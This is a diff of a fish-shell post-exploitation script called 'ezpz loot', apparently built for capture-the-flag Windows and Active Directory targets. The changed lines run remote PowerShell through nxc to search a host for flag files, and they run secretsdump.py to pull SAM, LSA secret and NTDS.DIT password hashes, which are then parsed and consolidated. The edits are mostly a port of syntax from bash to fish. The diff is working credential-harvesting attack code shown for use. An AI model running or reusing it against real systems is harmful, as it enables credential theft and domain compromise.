@@ -162,8 +162,8 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
     # Section 3: Extracting Secrets
     ezpz_header "Extracting secrets..."
 
-    ezpz_info "Searching for flag.txt"
-    set cmd "Get-ChildItem -Path C:/ -Recurse -Force -Filter flag.txt -ErrorAction SilentlyContinue | Get-Content"
+    ezpz_info "Searching for flag files (flag.txt, user.txt, root.txt)"
+    set cmd "Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"=== \$_.FullName ===\"; Get-Content \$_.FullName }"
     ezpz_cmd $cmd
     nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | sort -u
 
@@ -182,12 +182,11 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
 
     # Define output paths
     set secretsdump_output_base "$secretsdump_dir/$target-secrets"
-    set this_target_parsed_file "$base_dir/${target}-secrets.parsed"
+    set this_target_parsed_file "$base_dir/$target-secrets.parsed"
     set all_parsed_hashes_file_root "$base_dir/all-secrets.parsed"
     set tmp_this_target_collection (mktemp)
 
-    # Trap for temporary file cleanup
-    trap "rm -f '$tmp_this_target_collection'" EXIT TERM INT
+    # Note: Fish doesn't have trap - cleanup will happen at function end
 
     ezpz_info "Running secretsdump.py to extract hashes..."
 
@@ -222,7 +221,7 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
 
     # Track if any secretsdump output files were produced
     set secretsdump_output_found 0
-    if test -f "${secretsdump_output_base}.sam" -o -f "${secretsdump_output_base}.secrets" -o -f "${secretsdump_output_base}.ntds"
+    if test -f "$secretsdump_output_base.sam" -o -f "$secretsdump_output_base.secrets" -o -f "$secretsdump_output_base.ntds"
         set secretsdump_output_found 1
     end
 
@@ -230,21 +229,21 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
         ezpz_info "Extracted secrets for $target found. Parsing and consolidating for this target..."
 
         # Process .sam file
-        if test -f "${secretsdump_output_base}.sam"
-            ezpz_info "Parsing SAM hashes from ${secretsdump_output_base}.sam..."
-            cat "${secretsdump_output_base}.sam" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+        if test -f "$secretsdump_output_base.sam"
+            ezpz_info "Parsing SAM hashes from $secretsdump_output_base.sam..."
+            cat "$secretsdump_output_base.sam" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
         end
 
         # Process .secrets file (LSA Secrets)
-        if test -f "${secretsdump_output_base}.secrets"
-            ezpz_info "Parsing LSA secrets from ${secretsdump_output_base}.secrets..."
-            cat "${secretsdump_output_base}.secrets" | grep -oP '^\w+:\d+:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+        if test -f "$secretsdump_output_base.secrets"
+            ezpz_info "Parsing LSA secrets from $secretsdump_output_base.secrets..."
+            cat "$secretsdump_output_base.secrets" | grep -oP '^\w+:\d+:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
         end
 
         # Process .ntds file (NTDS.DIT hashes)
-        if test -f "${secretsdump_output_base}.ntds"
-            ezpz_info "Parsing NTDS hashes from ${secretsdump_output_base}.ntds..."
-            cat "${secretsdump_output_base}.ntds" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+        if test -f "$secretsdump_output_base.ntds"
+            ezpz_info "Parsing NTDS hashes from $secretsdump_output_base.ntds..."
+            cat "$secretsdump_output_base.ntds" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
         end
 
         # Consolidate all hashes collected for this target
@@ -288,6 +287,11 @@ Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [
     end
 
     echo ""
+
+    # Cleanup temporary file
+    if test -f "$tmp_this_target_collection"
+        rm -f "$tmp_this_target_collection"
+    end
 
     # Finalization
     ezpz_success "Done."
